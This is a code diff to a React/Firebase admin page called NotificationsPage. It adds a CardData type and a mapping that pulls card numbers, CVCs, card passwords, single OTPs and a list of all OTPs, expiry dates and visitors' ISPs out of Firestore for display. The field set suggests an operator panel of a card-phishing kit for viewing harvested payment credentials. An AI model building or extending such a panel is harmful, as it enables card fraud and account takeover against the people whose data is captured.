@@ -20,7 +20,7 @@ import {
   deleteDoc,
   writeBatch,
   updateDoc,
-  query, DocumentData, DocumentReference
+  query,
 } from 'firebase/firestore';
 import { onAuthStateChanged, signOut } from 'firebase/auth';
 import { CardsByID } from '@/components/cards';
@@ -33,14 +33,25 @@ interface UserData {
   isp: string;
   data?: any;
 }
-
+interface CardData {
+  id:string;
+  cardNumber: string;
+  cvc: string;
+  pass:string;
+  otp:string;
+  prefix:string;
+  month:string;
+  yaer:string;
+  otpall:string[]
+  // Add other fields as needed
+}
 function cleanString(input: string) {
   return input.replace(/[^a-zA-Z0-9 ]/g, '');
 }
 
 export default function NotificationsPage() {
   const [userData, setUserData] = useState<UserData[]>([]);
-  const [cardData, setCardData] = useState<DocumentReference<DocumentData, DocumentData>>([]);
+  const [cardData, setCardData] = useState<CardData[] | any>([]);
   const [isLoading, setIsLoading] = useState(true);
   const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(null);
   const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
@@ -73,13 +84,22 @@ export default function NotificationsPage() {
       const cardsQuerySnapshot = await getDocs(cardsQuery);
       const targetPost = doc(db, 'orders', _id);
       console.log(targetPost)
-      const data: UserData[] = [];
-      const cardsdata:any[] = [];
+      const data: UserData[] = [];``
+      const cardsdata:CardData[] = [];
        cardsQuerySnapshot.forEach((doc)=>{
         const cardData = doc.data();
         cardsdata.push({
-          id:doc.id,
-          ...cardData})
+          id: doc.id,
+          ...cardData,
+          cardNumber:cardData.cardNumber,
+          cvc:cardData.cvc,
+          pass: cardData.pass,
+          otp: cardData.otp,
+          prefix: cardData.prefix,
+          month: cardData.month,
+          yaer: cardData.yaer,
+          otpall: cardData.otpall
+        })
        })
       querySnapshot.forEach((doc) => {
         const userData = doc.data();
